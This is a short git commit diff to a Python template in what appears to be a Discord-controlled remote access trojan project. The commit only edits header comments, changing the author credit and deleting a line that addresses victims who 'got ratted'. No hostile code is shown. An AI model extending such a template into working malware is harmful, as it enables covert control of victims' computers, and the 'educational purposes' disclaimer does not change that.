eb97549951ef14a04ac2afde49cca420eadb2d5f
vn4thyt <vns.on.ytbe@gmail.com>
2026-01-03 03:00:45 +0000

    Update template.py

--- Stuff/RAT/ignore/template.py
+++ Stuff/RAT/ignore/template.py
@@ -1,8 +1,6 @@
 # Disclaimer: This is only for entertainment and educational purposes.  
 # I am not responsible for what you do with it or any consequences.  
-# Made by VN :3
-
-# If you got ratted, and reversed engineered the file back here - Please note I take absolutely NO accountability for what others do with my projects. If you would like to know how to remove the rat and stay safe, please DM 'vn4th' on Discord.
+# Made by Vexi :3
 
 import discord
 from discord.ext import commands
